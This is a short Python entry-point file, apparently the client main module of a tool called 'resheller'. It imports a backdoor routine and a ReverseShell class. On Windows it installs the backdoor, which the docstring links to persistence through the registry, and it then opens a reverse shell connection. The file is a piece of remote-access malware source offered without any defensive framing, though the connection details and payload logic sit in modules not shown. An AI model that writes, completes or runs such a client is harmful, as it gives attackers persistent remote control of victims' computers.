#!/usr/bin/env python
"""resheller.src.client.main"""
from os import name

from src.client.backdoor import backdoor
from src.client.reverse_shell import ReverseShell


def main() -> None:
    """Start the reverse shell and create a backdoor if running with
    windows
    .. todo::
        find out how to create a process similar to the register in
        Windows for Linux
    """
    if name == "nt":
        backdoor()
    resheller = ReverseShell()
    resheller.connect()
